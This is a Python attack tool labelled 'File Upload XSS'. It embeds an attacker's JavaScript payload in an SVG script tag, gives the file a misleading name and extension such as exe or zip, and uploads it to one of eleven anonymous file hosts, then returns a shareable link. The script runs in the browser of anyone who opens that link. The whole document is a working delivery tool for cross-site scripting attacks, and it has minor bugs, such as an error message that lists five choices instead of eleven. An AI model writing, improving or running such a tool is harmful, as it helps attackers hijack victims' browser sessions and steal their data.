import time
import os
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests


SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
"""

def main():
    ascii_art = f"""\033[32m
▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░
\033[34m
File Upload XSS by \033[36m@pakbch
"""
    print(ascii_art)
    print("\033[31m[1] \033[96manonfiles.com\n\033[31m[2] \033[96mbayfiles.com\n\033[31m[3] \033[96mletsupload.cc\n\033[31m[4] \033[96mfilechan.org\n\033[31m[5] \033[96mvshare.is\n\033[31m[6] \033[96mopenload.cc\n\033[31m[7] \033[96mmegaupload.nz\n\033[31m[8] \033[96mlolabits.se\n\033[31m[9] \033[96mrapidshare.nu\n\033[31m[10] \033[96mupvid.cc\n\033[31m[11] \033[96mhotfile.io")
    file_host = input("Choose a file host: ")

    if file_host == "1":
        url = "https://api.anonfiles.com/upload"
    elif file_host == "2":
        url = "https://api.bayfiles.com/upload"
    elif file_host == "3":
        url = "https://api.letsupload.cc/upload"
    elif file_host == "4":
        url = "https://api.filechan.org/upload"
    elif file_host == "5":
        url = "https://api.vshare.is/upload"
    elif file_host == "6":
        url = "https://api.openload.cc/upload"
    elif file_host == "7":
        url = "https://api.megaupload.nz/upload"
    elif file_host == "8":
        url = "https://api.lolabits.se/upload"
    elif file_host == "9":
        url = "https://api.rapidshare.nu/upload"
    elif file_host == "10":
        url = "https://api.upvid.cc/upload"
    elif file_host == "11":
        url = "https://api.hotfile.io/upload"

    
    else:
        print("Invalid choice. Please enter a number between 1 and 5.")
        return
    
    js_code = input("Where is your file path to the JavaScript payload file? -> ")
    name = input("What do you want to name the file? -> ")
    filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
    try:
        with open(js_code, "r") as f:
            js_code = f.read()
            js_code = '\t\t'.join(js_code.splitlines())
        
    except FileNotFoundError:
        print("File not found")
        time.sleep(3)
        exit()
    svg = SVG.replace("%code%", js_code)
    svg_bytes = svg.encode("utf-8")
    try:
        r = requests.post(url, files={"file": (f"{name}.{filetype}", svg_bytes)})
    except Exception as e:
        print(f"[-] {e}")
        time.sleep(3)
        exit()
    url = r.json()["data"]["file"]["url"]["full"]
    print(url)
    print("Done!")
    again = input("Do you want to use the script again? (Y/N) -> ")
    if again.lower() == "y":
        clear_screen()
        main()
    else:
        exit()

def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

while True:
    main()

if __name__ == '__main__':
    main()
    input("Press enter to exit")
